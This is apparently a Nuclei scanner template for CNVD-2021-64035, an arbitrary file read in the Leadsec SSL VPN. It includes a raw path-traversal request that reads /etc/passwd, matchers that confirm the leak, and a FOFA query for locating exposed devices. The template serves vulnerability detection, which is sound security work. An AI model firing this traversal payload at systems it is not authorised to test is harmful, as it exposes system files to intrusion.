http:
- matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - part: header
    type: word
    words:
    - appframe
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /vpn/user/download/client?ostype=../../../../../../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    '
id: CNVD-2021-64035
info:
  author: xiaoWangSec
  description: 'There is an information leakage vulnerability in the SSL VPN of Beijing
    Wangyuxingyun Information Technology Co., Ltd., and attackers can use the vulnerability
    to obtain sensitive information.

    '
  metadata:
    fofa-query: icon_hash="-15980305"
    max-request: 1
    verified: true
  name: Leadsec VPN - Arbitrary File Read
  reference:
  - https://avd.aliyun.com/detail?id=AVD-2021-888761
  - https://www.cnvd.org.cn/flaw/show/CNVD-2021-64035
  severity: high
  tags: cnvd,cnvd2024,lfi,leadsec,vpn,vuln
